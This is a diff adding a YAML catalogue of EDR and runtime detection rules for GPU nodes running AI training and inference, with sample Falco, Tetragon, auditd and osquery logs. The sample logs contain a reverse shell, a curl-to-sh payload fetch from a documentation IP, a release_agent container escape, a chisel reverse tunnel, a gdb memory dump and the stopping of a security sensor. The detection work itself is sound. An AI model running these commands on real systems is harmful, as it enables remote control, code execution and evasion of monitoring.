@@ -1,0 +1,140 @@
+category: Endpoint & Runtime Security
+code: EDR
+layer: Platform & Pipeline
+added: true
+scope: EDR / XDR on Linux GPU nodes, Falco, Tetragon, auditd, osquery, file integrity monitoring
+usecases:
+
+  - id: EDR-001
+    name: Reverse shell from a training container or notebook
+    severity: Critical
+    description: >-
+      A shell with stdin and stdout redirected to a network socket is interactive remote control. In a notebook or
+      training pod it usually follows a malicious model, dependency or notebook cell.
+    log_sources:
+      - Falco / runtime security events
+      - EDR process and network telemetry
+    detection: >-
+      Falco "Redirect STDOUT/STDIN to Network Connection in Container", or shells whose fd 0/1 are TCP sockets, on any
+      GPU node or AI namespace.
+    mappings: [T1059.004]
+    sample_log: |
+      {"hostname":"dgx-h100-r04-n11","output":"16:02:44.118021511: Notice Redirect stdout/stdin to network connection (gparent=containerd-shim ggparent=systemd fd.sip=203.0.113.50 connection=10.244.18.37:41822->203.0.113.50:443 lport=41822 rport=443 fd_type=ipv4 fd_proto=tcp evt_type=dup2 user=root user_uid=0 process=bash proc_exepath=/usr/bin/bash parent=python3 command=bash -i terminal=0 container_id=3f2a9c1e7b4d container_name=notebook k8s_ns=team-nlp k8s_pod_name=notebook-jsmith-0)","priority":"Notice","rule":"Redirect STDOUT/STDIN to Network Connection in Container","source":"syscall","tags":["T1059","container","maturity_stable","mitre_execution","network","process"],"time":"2026-11-12T16:02:44.118021511Z","output_fields":{"container.id":"3f2a9c1e7b4d","fd.sip":"203.0.113.50","proc.cmdline":"bash -i","proc.pname":"python3","k8s.ns.name":"team-nlp","k8s.pod.name":"notebook-jsmith-0"}}
+
+  - id: EDR-002
+    name: Binary dropped and executed inside a running container
+    severity: High
+    description: >-
+      Containers should only run binaries from their image. A new executable written to /dev/shm or /tmp and run is
+      the usual first step for miners and implants on GPU nodes.
+    log_sources:
+      - Falco / runtime security events
+      - EDR process telemetry
+    detection: >-
+      Falco "Drop and execute new binary in container", or execve of files from writable layers, /tmp, /dev/shm or
+      /var/tmp, in training and inference pods.
+    mappings: [T1105, T1059]
+    sample_log: |
+      {"hostname":"dgx-h100-r02-n05","output":"16:20:13.551209441: Critical Executing binary not part of base image (proc_exe=/dev/shm/.k/kworkerd proc_sname=bash gparent=containerd-shim proc_exe_ino_ctime=1794500412 proc_cwd=/dev/shm/.k/ evt_type=execve user=root user_uid=0 process=kworkerd command=kworkerd -c /dev/shm/.k/c.json container_id=9b8c7d6e5f4a container_image=nvcr.io/nvidia/pytorch k8s_ns=ml-train k8s_pod_name=trainer-3)","priority":"Critical","rule":"Drop and execute new binary in container","source":"syscall","tags":["container","maturity_stable","mitre_persistence","process"],"time":"2026-11-12T16:20:13.551209441Z","output_fields":{"proc.exe":"/dev/shm/.k/kworkerd","container.image.repository":"nvcr.io/nvidia/pytorch","k8s.ns.name":"ml-train","k8s.pod.name":"trainer-3"}}
+
+  - id: EDR-003
+    name: Memory of a training or inference process dumped
+    severity: High
+    description: >-
+      Training and serving processes hold decrypted model weights, API tokens and data batches in memory. Attaching a
+      debugger or reading /proc/<pid>/mem gets around file-level protections on the weights.
+    log_sources:
+      - Tetragon / eBPF kprobes (ptrace, process_vm_readv)
+      - Linux auditd (ptrace syscalls)
+      - EDR telemetry
+    detection: >-
+      PTRACE_ATTACH or process_vm_readv against python, tritonserver or vllm processes by another user or tool (gdb,
+      gcore), or core dumps written for those processes outside a debugging ticket.
+    mappings: [T1003.007, AML.T0035]
+    sample_log: |
+      {"process_kprobe":{"process":{"exec_id":"ZGd4LWgxMDAtcjA0LW4xMTo5MTIzNDo1MTI=","pid":91234,"uid":1042,"cwd":"/home/jsmith","binary":"/usr/bin/gdb","arguments":"-p 2214577 -batch -ex \"generate-core-file /dev/shm/c.core\"","start_time":"2026-11-12T16:44:01.118Z","auid":1042},"parent":{"pid":91200,"binary":"/usr/bin/bash"},"function_name":"__x64_sys_ptrace","args":[{"int_arg":16},{"int_arg":2214577}],"action":"KPROBE_ACTION_POST","policy_name":"ptrace-gpu-procs"},"node_name":"dgx-h100-r04-n11","time":"2026-11-12T16:44:01.120Z"}
+
+  - id: EDR-004
+    name: Library preloading via /etc/ld.so.preload
+    severity: Critical
+    description: >-
+      Writing to /etc/ld.so.preload injects a shared library into every process on the node. Miners and rootkits use
+      it to hide processes from nvidia-smi, ps and the EDR.
+    log_sources:
+      - Linux auditd (watch on /etc/ld.so.preload)
+      - File integrity monitoring
+    detection: >-
+      Any create or write to /etc/ld.so.preload, or LD_PRELOAD set in systemd units or /etc/environment, on GPU nodes.
+    mappings: [T1574.006]
+    sample_log: |
+      type=SYSCALL msg=audit(1794502162.412:93120): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffc1e2d3f40 a2=241 a3=1b6 items=2 ppid=99120 pid=99133 auid=1042 uid=0 gid=0 euid=0 comm="tee" exe="/usr/bin/tee" key="ld_preload"
+      type=PATH msg=audit(1794502162.412:93120): item=1 name="/etc/ld.so.preload" inode=131203 dev=08:02 mode=0100644 ouid=0 ogid=0 nametype=CREATE
+      type=PROCTITLE msg=audit(1794502162.412:93120): proctitle=746565002F6574632F6C642E736F2E7072656C6F6164
+
+  - id: EDR-005
+    name: EDR or runtime sensor stopped on a GPU node
+    severity: High
+    description: >-
+      Security agents get switched off on GPU nodes "for performance". That leaves the most valuable hosts unmonitored,
+      and it is also what an intruder does first.
+    log_sources:
+      - systemd journal
+      - EDR console heartbeat / sensor health
+      - sudo logs
+    detection: >-
+      Stop, disable or uninstall of EDR, Falco or Tetragon services, or a sensor heartbeat missing for more than 15
+      minutes while the node is still reporting GPU metrics.
+    mappings: [T1562.001]
+    sample_log: |
+      Nov 12 17:02:11 dgx-h100-r04-n11 sudo:   jsmith : TTY=pts/3 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/systemctl stop falcon-sensor
+      Nov 12 17:02:11 dgx-h100-r04-n11 systemd[1]: Stopping falcon-sensor.service - CrowdStrike Falcon Sensor...
+      Nov 12 17:02:13 dgx-h100-r04-n11 systemd[1]: falcon-sensor.service: Deactivated successfully.
+
+  - id: EDR-006
+    name: Inference or notebook server spawns a shell
+    severity: Critical
+    description: >-
+      vLLM, Triton, Jupyter and MLflow servers are Python processes that should not start sh, bash or curl. When they
+      do, it usually means remote code execution through a model loader, deserialization bug or exposed API.
+    log_sources:
+      - Tetragon / Falco process events
+      - EDR process telemetry
+    detection: >-
+      Shells, curl, wget, nc or python -c spawned by inference server or MLOps service processes (vllm, tritonserver,
+      jupyter, mlflow, ray) in production namespaces.
+    mappings: [T1190, T1059.004]
+    sample_log: |
+      {"process_exec":{"process":{"exec_id":"aW5mZXItbjA3OjEyMzQ1Njc4OTo0NDE=","pid":441902,"uid":1000,"cwd":"/workspace","binary":"/bin/sh","arguments":"-c \"curl -s http://203.0.113.50/x | sh\"","start_time":"2026-11-12T17:20:44.512Z","pod":{"namespace":"inference-prod","name":"vllm-llama-70b-0","container":{"name":"vllm","image":{"name":"vllm/vllm-openai:v0.11.0"}}}},"parent":{"pid":1,"binary":"/usr/bin/python3","arguments":"-m vllm.entrypoints.openai.api_server --model /models/llama-70b --tensor-parallel-size 8"}},"node_name":"dgx-h100-r07-n02","time":"2026-11-12T17:20:44.512Z"}
+
+  - id: EDR-007
+    name: Container escape technique observed (release_agent or nsenter)
+    severity: Critical
+    description: >-
+      Writing a cgroup release_agent, running nsenter against PID 1, or mounting the host disk from a container are
+      textbook escapes. On a GPU node they expose every co-located tenant.
+    log_sources:
+      - Falco / runtime security events
+      - EDR telemetry
+    detection: >-
+      Falco "Detect release_agent File Container Escapes", nsenter -t 1 inside containers, or mount of host block
+      devices from containers.
+    mappings: [T1611]
+    sample_log: |
+      {"hostname":"dgx-h100-r02-n05","output":"17:41:09.330112040: Critical Detect an attempt to exploit a container escape using release_agent file (file=/tmp/cgrp/release_agent user=root user_loginuid=-1 command=sh -c echo /cmd > /tmp/cgrp/release_agent container_id=9b8c7d6e5f4a image=docker.io/library/ubuntu cap_effective=CAP_SYS_ADMIN)","priority":"Critical","rule":"Detect release_agent File Container Escapes","source":"syscall","tags":["T1611","container","maturity_stable","mitre_privilege_escalation","process"],"time":"2026-11-12T17:41:09.330112040Z","output_fields":{"fd.name":"/tmp/cgrp/release_agent","proc.cmdline":"sh -c echo /cmd > /tmp/cgrp/release_agent","container.id":"9b8c7d6e5f4a"}}
+
+  - id: EDR-008
+    name: Tunneling or proxy tool running on a GPU node
+    severity: High
+    description: >-
+      chisel, frp, ligolo and ngrok punch reverse tunnels out of the data center, giving an outside operator a path to
+      internal APIs, BMCs and storage.
+    log_sources:
+      - osquery process events
+      - EDR process telemetry
+      - Firewall logs
+    detection: >-
+      Known tunneling tool names or hashes, command lines with "client ... R:" or "socks", or long-lived outbound
+      connections from processes running from /tmp, /dev/shm or home directories.
+    mappings: [T1572, T1105, T1090]
+    sample_log: |
+      {"name":"process_events","hostIdentifier":"dgx-h100-r04-n11","calendarTime":"Thu Nov 12 19:22:31 2026 UTC","unixTime":1794511351,"epoch":0,"counter":0,"numerics":false,"columns":{"pid":"99812","path":"/tmp/.cache/chisel","cmdline":"/tmp/.cache/chisel client 203.0.113.50:443 R:socks","parent":"88120","uid":"1042","cwd":"/tmp/.cache","time":"1794511351"},"action":"added"}
